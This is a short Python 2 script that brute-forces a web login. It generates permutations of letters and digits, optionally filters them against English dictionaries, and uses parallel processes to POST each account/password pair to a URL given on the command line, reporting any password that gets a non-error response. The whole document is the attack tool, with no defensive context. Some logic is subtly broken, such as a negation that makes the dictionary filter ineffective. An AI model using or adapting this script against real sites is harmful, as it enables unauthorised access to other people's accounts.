import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant

chunk_size = 50000
allow_number = True
allow_uppercase = False
allow_dict = True

dictstring = 'abcdefghijklmnopqrstuvwxyz_'

if allow_number:
    dictstring += '0123456789'
    pass

if allow_uppercase:
    dictstring += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    pass

uk = enchant.Dict("en_UK")
us = enchant.Dict("en_US")

def process(temp,url,form,form1,account):
    jobs = []
    p = multiprocessing.Process(target=work, args=(temp,url,form,form1,account,))
    jobs.append(p)
    p.start()
    pass

def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
    temp = []
    for l in itertools.permutations(dictstring, i):
        if allow_dict and filter_dict(''.join(l)):
            temp.append(l)
        elif ~allow_dict:
            temp.append(l)
            pass
        if len(temp) > chunk_size:
            process(temp,url,form,form1,account)
            del temp[:]
            pass
        pass

    if len(temp)>0:
        process(temp,url,form,form1,account)
        del temp[:]
        pass
    pass

if __name__ == '__main__':
    jobs = []
    try:
    	account = sys.argv[1]
    	n = int(sys.argv[2])
    	m = int(sys.argv[3])
    	url = sys.argv[4]
    	pass
    except Exception, e:
    	print e
    	print 'Error... program is going to be exit...'
    	sys.exit()
    	pass
    try:
    	form = sys.argv[5]
    	pass
    except Exception, e:
    	form = 'account'
    	pass
    try:
    	form1 = sys.argv[6]
    	pass
    except Exception, e:
    	form1 = 'password'
    	pass

    for i in xrange(n,m+1):
    	p = multiprocessing.Process(target=brute, args=(i,url,form,form1,account,))
        jobs.append(p)
        p.start()

def work(res, url, form, form1, account):
    for n in res:
        password = ''.join(n)
        send(url, form, form1, account, password)
        pass
    pass

# form => password filed
def send(url, form, form1, account, password):
	try: 
		if urllib2.urlopen(urllib2.Request(url, urllib.urlencode({form : account ,form1 : password}))).getcode() < 400:
			print 'success! ...... password: ' + str(password)
			os.kill(signal.CTRL_C_EVENT, 1)
			pass
		pass
	except Exception, e:
		''
	pass

def filter_dict(words):
    if len(words) < 3:
        return True
        pass
    s = ''
    for x in words:
        s += x
        if len(s) > 2 and (uk.check(s) or us.check(s)):
            return True
            pass
        pass
    pass

def chunks(l, n):
    """ Yield successive n-sized chunks from l.
    """
    for i in xrange(0, len(l), n):
        yield l[i:i+n]  